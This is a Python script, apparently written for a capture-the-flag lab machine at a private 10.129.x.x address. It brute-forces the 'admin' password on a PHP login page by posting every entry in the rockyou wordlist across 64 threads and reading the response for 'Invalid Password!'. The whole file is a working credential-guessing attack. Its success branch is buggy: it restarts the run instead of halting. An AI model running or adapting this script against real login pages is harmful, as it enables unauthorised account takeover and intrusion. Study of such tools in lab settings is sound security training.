#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import requests,random
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

def brute(password):
    cookies = {
        'PHPSESSID': '25t48jc5duc8unsers7ov3t7c5',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://10.129.96.203',
        'Connection': 'keep-alive',
        'Referer': 'http://10.129.96.203/department/login.php',
        'Upgrade-Insecure-Requests': '1',
    }

    data = {
      'username': 'admin',
      'password': password
    }

    response = requests.post('http://10.129.96.203/department/login.php', headers=headers, cookies=cookies, data=data)
    soup = BeautifulSoup(response.text,'html.parser', from_encoding='utf-8')
    div_b = soup.find_all('b')
    result = div_b[0].string
    result_str = str(result)
    return result_str

file = open('/usr/share/wordlists/rockyou.txt','r')
stop_threads = False

def job(password):
    result_str = brute(password)
    if result_str == 'Invalid Password!':
        print(password,"錯誤")
    else:
        print(password,'correct')
        run().setDaemon(True)
def run():
    with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as file:
        with ThreadPoolExecutor(max_workers=64) as executor:
            for i in file.readlines():
                password = i.strip()
                executor.submit(job,password)

run()
#while True:
#    try:
#        password = file.readline()
#        password = password.strip()
#        brute(password)
#    except Exception as e:
#        print(password,e)